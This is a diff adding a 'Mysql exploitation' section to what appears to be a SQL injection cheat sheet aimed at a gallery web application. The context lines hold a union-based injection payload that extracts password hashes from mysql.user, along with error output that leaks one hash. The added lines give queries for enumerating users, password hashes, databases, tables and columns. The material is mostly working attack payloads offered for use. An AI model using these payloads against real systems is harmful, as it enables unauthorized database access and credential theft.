@@ -97,3 +97,19 @@ Table 'gallery.XXX' doesn't existCould not select category*
     Leak the password:
     *1+union+(select+password,2,3,4,5,6+from+mysql.user)%23
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1*
+
+ Mysql exploitation
+    Find current user
+    *SELECT user();*
+SELECT system_user();*
+    List all Users
+    *SELECT user FROM mysql.user; — priv*
+    List password hashes
+    *SELECT host, user, password FROM mysql.user; — priv*
+    List databases
+    *SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
+    SELECT distinct(db) FROM mysql.db — priv*
+    List columns
+    *SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
+    List tables
+    *SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
